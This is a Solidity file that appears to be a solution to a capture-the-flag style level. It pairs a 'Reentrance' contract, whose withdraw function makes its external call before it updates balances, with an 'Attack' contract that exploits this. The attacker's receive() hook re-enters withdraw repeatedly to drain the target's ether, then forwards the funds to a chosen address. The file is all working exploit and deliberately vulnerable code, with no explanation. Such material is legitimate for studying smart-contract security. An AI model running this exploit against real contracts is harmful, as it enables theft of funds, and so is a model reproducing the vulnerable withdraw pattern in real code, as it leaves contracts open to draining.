// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/v4.7.3/contracts/utils/math/SafeMath.sol";

contract Reentrance {
  
  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}

contract Attack {
    address payable public target;
    constructor(address payable _target) {
        target = _target;
    }
    receive() external payable {
        if (target.balance > 0) {
            Reentrance(target).withdraw(0.001 ether);
        }
    }
    function donate() external payable{
        Reentrance(target).donate{value: msg.value}(address(this));
    }
    function attack() external {
        Reentrance(target).withdraw(0.001 ether);
    }
    function withdraw(address payable _addr) external {
      _addr.transfer(address(this).balance);
    }
}